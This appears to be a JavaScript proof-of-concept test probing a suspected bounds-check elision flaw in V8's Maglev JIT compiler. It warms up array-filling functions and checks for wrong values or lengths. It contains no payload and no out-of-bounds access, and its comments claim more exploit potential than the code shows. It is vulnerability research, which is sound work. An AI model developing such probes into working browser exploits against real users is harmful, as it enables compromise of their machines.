// PoC: Maglev Virtual Object Bounds Check Elision
// Target: maglev-graph-builder.cc CanElideBoundCheckAndResizing (line ~6348)
//
// For kStoreInLiteral access mode, bounds checks are elided based on
// virtual object length tracking. The signed/unsigned comparison issue
// and stale virtual object state could be exploited.

function boundsElisionBug() {
  // Array literals use kStoreInLiteral for initialization
  // The virtual object tracks the length during graph building
  let arr = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]; // length = 10
  
  // These stores should have bounds checks elided due to kStoreInLiteral
  for (let i = 0; i < 10; i++) {
    arr[i] = i * 1.1;
  }
  
  return arr;
}

// Warmup
for (let i = 0; i < 100000; i++) {
  boundsElisionBug();
}

// Verify
let result = boundsElisionBug();
for (let i = 0; i < 10; i++) {
  if (Math.abs(result[i] - i * 1.1) > 0.001) {
    console.log("BUG: Wrong value at index " + i + ": " + result[i]);
  }
}

// More targeted: try to confuse virtual object length tracking
function boundsElisionBug2(n) {
  // Create array with dynamic-looking but actually constant length
  let arr = new Array(n);
  
  // Fill with kStoreInLiteral-like pattern
  for (let i = 0; i < n; i++) {
    arr[i] = i;
  }
  
  // Now try to access beyond what the virtual object thinks is the length
  // The virtual object may have a stale length if n changes between
  // compilation and execution
  return arr;
}

for (let i = 0; i < 100000; i++) {
  boundsElisionBug2(10);
}

// Try with different size after compilation
let r2 = boundsElisionBug2(5);
if (r2.length !== 5) {
  console.log("BUG: Wrong length: " + r2.length);
}

console.log("Bounds elision test completed");
